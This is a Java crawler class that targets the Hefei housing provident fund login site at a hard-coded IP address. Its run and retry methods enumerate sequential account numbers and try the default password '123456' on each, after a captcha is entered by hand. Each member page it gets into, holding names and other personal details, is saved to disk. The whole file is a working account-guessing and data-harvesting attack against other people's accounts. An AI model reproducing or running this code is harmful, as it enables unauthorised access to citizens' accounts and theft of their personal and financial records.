package cn.springmvc.spider.gjj;

import cn.springmvc.spider.HttpClientFactory;
import cn.springmvc.util.FileUtil;
import cn.springmvc.util.StringUtil;
import lombok.extern.slf4j.Slf4j;
import org.apache.http.impl.client.CloseableHttpClient;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * @author nidayu
 * @Description: 安徽合肥
 * @date 2016/12/2
 */
@Slf4j
public class HeFei extends HttpClientFactory {

    private CloseableHttpClient httpClient;

    public HeFei(CloseableHttpClient httpClient){
        this.httpClient = httpClient;
    }

    public void init(){
        String url = "http://117.71.52.54/hfgjj/jsp/web/public/search/grlogin.jsp";
        getUrl(url);
        url = "http://117.71.52.54/hfgjj/code.jsp";
        downloadImgByGet(url, "http://117.71.52.54/hfgjj/jsp/web/public/search/grlogin.jsp", "c://1202/"+System.currentTimeMillis()+".png");
    }

    public int login(String userName, String password, String authCode) {
        String[][] params = {
                {"lb", "a"}, {"hm", userName},
                {"mm", password}, {"yzm", authCode},
                {"imageField.x", "39"}, {"imageField.y", "7"}
        };
        String url = "http://117.71.52.54/hfgjj/jsp/web/public/search/grloginAct.jsp";
        String[][] headers = new String[][]{
                {"Referer", "http://117.71.52.54/hfgjj/jsp/web/public/search/grlogin.jsp"}
        };
        String responseString = postUrl(url, params, headers);
        if (responseString != null && responseString.contains("window.location='grCenter.jsp") && !responseString.contains("alert")) {
            url = "http://117.71.52.54/hfgjj/jsp/web/public/search/" + StringUtil.subStrIgnoreFirst("window.location='", "'" , responseString);
            String text = getUrl(url, new String[][]{{"Referer", "http://117.71.52.54/hfgjj/jsp/web/public/search/grloginAct.jsp"}});
            Document doc = Jsoup.parse(text);
            String[][] params2 = {
                    {"url", (Integer.parseInt(doc.select("input[name=url]").attr("value")) + 1) + ""},
                    {"dkzh", doc.select("input[name=dkzh]").attr("value")}
            };
            url = "http://117.71.52.54/hfgjj/jsp/web/public/search/grCenter.jsp?rnd=" + StringUtil.subStrIgnoreFirst("grCenter.jsp?rnd", "\"" , responseString);
            responseString = postUrl(url, params2);
            if (responseString != null && responseString.contains("职工基本信息")) {
                try {
                    FileOutputStream fos = new FileOutputStream("C:\\合肥\\"+userName+".html");
                    fos.write(responseString.getBytes());
                    fos.close();
                } catch (IOException e) {

                }
            } else {
                return 2;
            }
        } else if (responseString != null && responseString.contains("alert")){
            log.info(StringUtil.subStrIgnoreFirst("alert(", ")", responseString));
            return 0;
        }
        return 1;
    }

    public void retry(String authCode){
        String path="C:\\合肥\\";
        File file=new File(path);
        File[] tempList = file.listFiles();
        String text;
        for (int i = 0; i < tempList.length; i ++){
            text = FileUtil.readFile(path + tempList[i].getName());
            if (!text.contains("姓名")){
                String fileName = tempList[i].getName();
                fileName = fileName.replace(".html", "");
                login(fileName, "123456", authCode);
            }
        }
    }

    public void getHasNotCrawler(){
        String path="C:\\合肥\\";
        File file=new File(path);
        File[] tempList = file.listFiles();
        String text;
        System.out.println(tempList.length);
        int index = 0;
        for (int i = 0; i < tempList.length; i ++){
            text = FileUtil.readFile(path + tempList[i].getName());
            if (!text.contains("姓名")){
                index ++;
                String fileName = tempList[i].getName();
                System.out.println(fileName);
            }
        }
        System.out.println(index);
    }

    public List<String> getFileNames(){
        String path="C:\\合肥\\";
        File file=new File(path);
        File[] tempList = file.listFiles();
        List<String> names = new ArrayList<>();
        for (int i = 0; i < tempList.length; i ++){
            names.add(tempList[i].getName().replace(".html", ""));
        }
        return names;
    }

    public static void main(String[] args) {

        CloseableHttpClient httpClient = getInstance();
        HeFei hefei = new HeFei(httpClient);

        // 初始化
        hefei.init();
        String authCode = StringUtil.inputYanzhengma();
        // 以验证码的方式进去
        hefei.login("510104818", "123456", authCode);

        // 获取没抓全的信息
//        hefei.getHasNotCrawler();
        // 重新跑没抓全的数据
        hefei.retry(authCode);

        //开始进行抓取
//        hefei.run(hefei, authCode);
    }

    private void run(HeFei hefei, String authCode){
        String first = "51";
        List<String> names = hefei.getFileNames();
        // 进行循环
        int outFlag = 94;
        int intFlag = 288;
        error : for (int j = outFlag; j < 10000; j++){
            String begin = "000" + j;
            begin = begin.substring(begin.length() - 4);
            no : for (int i = 1; i < 1000 ; i++) {
                if (j == outFlag && i < intFlag){
                    i = intFlag;
                }
                String end = "00" + i;
                end = end.substring(end.length() - 3);
                String account = first + begin + end;
                if (!names.contains(account)) {
                    System.out.println(account);
                    hefei.login(account, "123456", authCode);
                }
            }
        }
    }


}
